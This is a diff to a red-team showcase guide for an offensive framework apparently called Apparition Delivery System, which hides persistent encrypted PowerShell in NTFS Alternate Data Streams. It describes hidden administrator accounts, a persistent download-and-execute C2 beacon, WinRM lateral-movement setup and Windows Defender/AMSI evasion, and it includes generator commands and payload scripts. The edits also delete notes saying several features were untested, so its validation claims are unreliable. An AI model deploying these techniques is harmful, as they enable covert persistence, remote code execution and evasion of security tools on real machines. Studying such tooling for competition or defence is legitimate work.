@@ -1,4 +1,4 @@
-# Red Team Showcase — Apparition Delivery System v2.4
+# Red Team Showcase — Apparition Delivery System v2.5
 
 **For:** Red team briefings, onboarding, and live demos
 **Run the companion script:** `tests/red-team-showcase.ps1` to auto-generate all deployment one-liners
@@ -7,9 +7,9 @@
 
 ## What You Just Got
 
-You have a framework that hides persistent, encrypted PowerShell execution inside NTFS Alternate Data Streams. It's invisible to dir and explorer, and it's running clean against Windows Defender as of this writing. A task fires at every logon, every boot, every 5 minutes on a randomized schedule (choices are yours). The files look like Windows cache artifacts. The task names look like Windows maintenance tasks. The streams don't appear at all unless you specifically look at the streams, and the zerowidth unicode option can make deleting it a pain.
+You have a framework that hides persistent, encrypted PowerShell execution inside NTFS Alternate Data Streams — invisible to `dir`, invisible to File Explorer, and running clean against Windows Defender. A task fires at every logon, every boot, every 5 minutes on a randomized schedule. The files look like Windows cache artifacts. The task names look like Windows maintenance tasks. The streams? They don't appear at all unless you know the exact `Get-Item -Stream *` incantation.
 
-Every payload below is one generate-on-Kali + paste-on-Windows operation. No uploads. No staging servers (unless you use this as an agent waiting to be served powershell script). No compiled binaries.
+Every payload below is one generate-on-Kali + paste-on-Windows operation. No uploads. No staging servers. No compiled binaries.
 
 ---
 
@@ -45,7 +45,7 @@ Stop-Process -Name SecurityHealthSystray -Force -ErrorAction SilentlyContinue; R
 
 ---
 
-### A2: Invisible Admin Account (USR-002) (remote login test needed, my local vm to vm not playing nice)
+### A2: Invisible Admin Account (USR-002)
 
 **What it does:** Creates a local administrator account hidden from the Windows login screen and the User Accounts panel. `net user` reveals it if you know to look. Control Panel, Settings > Accounts, and the login screen don't.
 
@@ -92,7 +92,7 @@ pwsh src/ADS-OneLiner.ps1 \
 
 ---
 
-### A4: Full C2 Cradle — Persistent Download Beacon (C2-001) (saw connect callback, need to test payload delivery)
+### A4: Full C2 Cradle — Persistent Download Beacon (C2-001)
 
 **What it does:** Installs a persistent download-and-execute beacon that fires every 5 minutes. Points to your HTTP server. When your server returns a PowerShell script, it executes it. When it returns empty, nothing happens. Fire-and-forget command execution.
 
@@ -122,7 +122,7 @@ pwsh src/ADS-OneLiner.ps1 \
 
 ---
 
-### A5: Lateral Movement Prep — WinRM + PSRemoting (LAT-001 + LAT-002) (need to test on machine with winrm on a network)
+### A5: Lateral Movement Prep — WinRM + PSRemoting (LAT-001 + LAT-002)
 
 **What it does:** Opens WinRM and enables PowerShell Remoting with wildcard TrustedHosts. After this fires, you can `Enter-PSSession -ComputerName TARGET -Credential ...` from anywhere on the network.
 
@@ -160,9 +160,9 @@ Why ADS makes the blue team's job genuinely difficult. Not just hard — *differ
 The only way to find our streams is:
 - **`dir /r C:\ProgramData`** (cmd) — shows stream sizes as extra lines, easy to miss
 - **`Get-Item <file> -Stream *`** (PowerShell) — explicit stream enumeration
-- **Sysmon Event 15** (FileCreateStreamHash) — fires on ADS creation (a normal event), needs Sysmon installed and careful monitoring
+- **Sysmon Event 15** (FileCreateStreamHash) — fires on ADS creation, needs Sysmon installed
 
-In a competition environment with blue team triaging 40 machines? They'll find most things first. The ADS is last.
+In a competition environment with no Sysmon and blue team triaging 40 machines? They'll find most things first. The ADS is last.
 
 ---
 
@@ -188,13 +188,11 @@ The payload is stored inside an NTFS ADS — a fork of a legitimate system file 
 
 If `-Encrypt` is used, the ADS content is a DPAPI-encrypted blob. Even if someone finds the stream, they need the machine's DPAPI master key to read it.
 
-If ZeroWidthStream is used, they need the exact character used, or delete the entire file (hopfully we didn't attach to an important one and/or they made a backup first).
-
 ---
 
 ### Defender Can't See the Compound
 
-Defender's ClickFix.TFC signature triggers on the compound of DPAPI + MachineGuid + XOR AMSI bypass + scheduled task creation appearing together in a scannable command. ADS v2.4 hides that compound inside a DeflateStream-compressed base64 blob (`-EncodedCommand`). The command line Defender sees is:
+Defender's ClickFix.TFC signature triggers on the compound of DPAPI + MachineGuid + XOR AMSI bypass + scheduled task creation appearing together in a scannable command. ADS v2.5 hides that compound inside a DeflateStream-compressed base64 blob (`-EncodedCommand`). The command line Defender sees is:
 
 ```
 powershell.exe -NoP -W Hidden -EP Bypass -EncodedCommand AAABBB...
@@ -202,7 +200,7 @@ powershell.exe -NoP -W Hidden -EP Bypass -EncodedCommand AAABBB...
 
 That's it. The compound is only visible after decompression inside the PS runtime — at which point AMSI bypass (Layer B, in the JScript stub) has already fired.
 
-**Validated clean:** T3-v2, T11-v2 (Session 16), T8/T9/T10/M1-M4 (2026-02-19). Zero Defender Event 1116 across all tests.
+**Validated clean:** T3-v2 (CONFIRMED PASS), T11-v2 (CONFIRMED PASS), T-ENC-3 (CONFIRMED PASS), T-REG-ENC Phase 2 (CONFIRMED PASS), T8/T9/T10/M1-M4 (2026-02-19). Zero Defender Event 1116 across all tests.
 
 ---
 
@@ -224,7 +222,7 @@ Blue team looking for `Register-ScheduledTask` in command lines? Not there. Look
 
 ### Zero-Width Streams (Paranoid Tier)
 
-In Paranoid mode, the ADS stream name contains zero-width Unicode codepoints (U+200B, U+200C, U+FEFF). The stream name displays as blank or invisible in most tools:
+In Paranoid mode, the ADS stream name defaults to `$Data` with a zero-width Unicode suffix (U+200B, U+200C, or U+FEFF appended). The stream name displays as blank or invisible in most tools:
 
 ```
 C:\ProgramData\Microsoft\Windows\WER\Cache\cache.cab:     (3.1 KB)
@@ -267,7 +265,7 @@ pwsh src/ADS-OneLiner.ps1 \
 
 ### C2: Caps Lock Disco (MEME-005) — SYSTEM OK
 
-**What it does:** Blinks Caps Lock, Num Lock, and Scroll Lock LEDs in a rapid sequence for 60 seconds (time-limited for competition safety). Physical keyboard LEDs react even to SYSTEM context key events. Might be my favorite.
+**What it does:** Blinks Caps Lock, Num Lock, and Scroll Lock LEDs in a rapid sequence for 60 seconds (time-limited for competition safety). Physical keyboard LEDs react even to SYSTEM context key events.
 
 **Defender status:** VM-Validated CLEAN (2026-02-19, M2 test)
 
@@ -327,7 +325,7 @@ pwsh src/ADS-OneLiner.ps1 \
 
 ### C4: Wall of Notepads (MEME-002) — Registry Persist Required
 
-**What it does:** Opens 10 cascading Notepad windows with a red team message when the user logs on. Each window opens in the user's interactive session with your message front and center. (pretty funny tbh, but it can really spam the windows)
+**What it does:** Opens 10 cascading Notepad windows with a red team message when the user logs on. Each window opens in the user's interactive session with your message front and center.
 
 **Defender status:** VM-Validated CLEAN (2026-02-19, M4 test, with `-Persist registry`)
 
@@ -350,7 +348,7 @@ pwsh src/ADS-OneLiner.ps1 \
 
 ### C5: OIIA Spinning Proof-of-Compromise (MEME-008) — Registry Persist Required
 
-**What it does:** Spawns a visible console that displays a spinning ASCII cat animation for 30 seconds, then prints live recon: hostname, username, privilege level, local admin count, and timestamp. Proof that you were there, in the most delightful possible format. (it interrupts a powershell session in an annoying way)
+**What it does:** Spawns a visible console that displays a spinning ASCII cat animation for 30 seconds, then prints live recon: hostname, username, privilege level, local admin count, and timestamp. Proof that you were there, in the most delightful possible format.
 
 ```bash
 cat > /tmp/meme008.ps1 << 'EOF'
@@ -360,7 +358,7 @@ $i = 0
 while ((Get-Date) -lt $end) {
   [Console]::SetCursorPosition(0,0)
   Write-Host $frames[$i % 4] -ForegroundColor Cyan
-  Write-Host "RED TEAM WAS HERE — ADS v2.4" -ForegroundColor Red
+  Write-Host "RED TEAM WAS HERE — ADS v2.5" -ForegroundColor Red
   $i++; Start-Sleep -Milliseconds 250
 }
 Write-Host "`n=== PROOF OF COMPROMISE ===" -ForegroundColor Red
@@ -389,7 +387,7 @@ cat > /tmp/meme009.ps1 << 'EOF'
 $msg = @"
 +------------------------------------------+
 |     OIIA — RED TEAM WAS HERE             |
-|     Apparition Delivery System v2.4      |
+|     Apparition Delivery System v2.5      |
 |     "Execution without presence"         |
 +------------------------------------------+
 Hostname : $env:COMPUTERNAME
@@ -410,7 +408,7 @@ pwsh src/ADS-OneLiner.ps1 \
 
 ---
 
-## Section D: Power Plays — Combo Scenarios (testing needed)
+## Section D: Power Plays — Combo Scenarios
 
 Multiple effects, one deployment. Choose your chaos level.
 
@@ -495,6 +493,7 @@ pwsh src/ADS-OneLiner.ps1 \
   -PeriodicMinutes 10 \
   -JitterPercent 30 \
   -OutputFile /tmp/showcase-d2-stealth.txt
+# Note: -Encrypt is automatically enabled by -Obfuscate Paranoid — no need to specify it explicitly.
 ```
 
 ---
@@ -510,7 +509,7 @@ pwsh src/ADS-OneLiner.ps1 \
 # Generate three separate registry persist one-liners
 cat > /tmp/chaos-clip.ps1 << 'EOF'
 Add-Type -AssemblyName PresentationCore
-while($true){ [Windows.Clipboard]::SetText('RED TEAM WAS HERE — ADS v2.4'); Start-Sleep 30 }
+while($true){ [Windows.Clipboard]::SetText('RED TEAM WAS HERE — ADS v2.5'); Start-Sleep 30 }
 EOF
 
 cat > /tmp/chaos-caps.ps1 << 'EOF'
